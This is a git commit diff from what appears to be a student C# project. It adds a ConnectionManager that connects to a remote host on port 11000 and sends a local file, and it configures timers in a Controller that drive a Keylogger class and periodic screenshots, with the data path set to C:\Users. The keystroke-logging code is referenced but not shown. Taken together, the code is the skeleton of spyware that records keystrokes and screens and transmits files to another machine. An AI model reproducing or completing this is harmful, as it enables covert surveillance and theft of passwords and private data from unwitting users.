858a076844873c825dd91d34be2c16c3f1ed3f1c
swordbreaker <tobias.bollinger@gmail.com>
2014-12-24 03:04:36 +0100

    Added ConnectionManager and FileManager

---
+++ Server/idpaClient/ConnectionManager.cs
@@ -0,0 +1,45 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.IO;
+using System.Net;
+using System.Net.Sockets;
+
+namespace idpaServer
+{
+    class ConnectionManager
+    {
+        public static void Main(string[] args)
+        {
+            // Establish the local endpoint for the socket.
+            IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());
+            IPAddress ipAddr = ipHost.AddressList[6];
+            //IPAddress ipAddr = IPAddress.Parse("192.168.178.22");
+            IPEndPoint ipEndPoint = new IPEndPoint(ipAddr, 11000);
+
+            Console.WriteLine(ipHost.AddressList.Length);
+            Console.WriteLine(ipAddr);
+            Console.WriteLine(ipEndPoint);
+
+            // Create a TCP socket.
+            Socket client = new Socket(AddressFamily.InterNetwork,
+                    SocketType.Stream, ProtocolType.Tcp);
+
+            // Connect the socket to the remote endpoint.
+            client.Connect(ipEndPoint);
+
+            // There is a text file test.txt located in the root directory. 
+            string fileName = "C:\\test.txt";
+
+            // Send file fileName to remote device
+            Console.WriteLine("Sending {0} to the host.", fileName);
+            client.SendFile(fileName);
+
+            // Release the socket.
+            client.Shutdown(SocketShutdown.Both);
+            client.Close();
+        }
+    }
+}
--- Server/idpaClient/Controller.cs
+++ Server/idpaClient/Controller.cs
@@ -13,9 +13,9 @@ namespace idpaServer
         //Config
         public const string APP_PATH = @"C:\Temp";
         public const string DATA_PATH = @"C:\Users";
-        public const int PRINT_SCREEN_INTERVAL = 60000; //Intervall in miliseconds 1000 = 1 sek
+        public const int PRINT_SCREEN_INTERVAL = 60000; //Interval in which a Screenshot is taken -- Intervall in miliseconds 1000 = 1 sek
         public const int KEY_LOG_INTERVAL = 10; //Intervall in which keys will be stored in the Logger Object
-        public const int KEY_LOGFILE_INTERVAL = 30000; //Intervall in which the log file will be updated 60 sek = 60000
+        public const int KEY_LOGFILE_INTERVAL = 30000; //Intervall in which the log file will be updated
 
         //Timers
         private static System.Timers.Timer timerPrintScreen;
@@ -24,22 +24,22 @@ namespace idpaServer
 
         public static void Init()
         {
+            //Create Timers
             timerPrintScreen = new System.Timers.Timer(PRINT_SCREEN_INTERVAL);
             timerKey = new System.Timers.Timer(KEY_LOG_INTERVAL);
             timerKeyLogfile = new System.Timers.Timer(KEY_LOGFILE_INTERVAL);
 
+            //Add the Events to the Timers
             //timerPrintScreen.Elapsed += new ElapsedEventHandler(PrintScreen.GetScreenshot);
             timerKey.Elapsed += new ElapsedEventHandler(Keylogger.KeyTick);
             timerKeyLogfile.Elapsed += new ElapsedEventHandler(Keylogger.LogTick);
 
-            timerPrintScreen.Interval = PRINT_SCREEN_INTERVAL;
-            timerKey.Interval = KEY_LOG_INTERVAL;
-            timerKeyLogfile.Interval = KEY_LOGFILE_INTERVAL;
-
+            //Enable the Timers
             timerPrintScreen.Enabled = true;
             timerKey.Enabled = true;
             timerKeyLogfile.Enabled = true;
 
+            //use KeepAlive for long runnig Timers
             GC.KeepAlive(timerPrintScreen);
             GC.KeepAlive(timerKey);
             GC.KeepAlive(timerKeyLogfile);
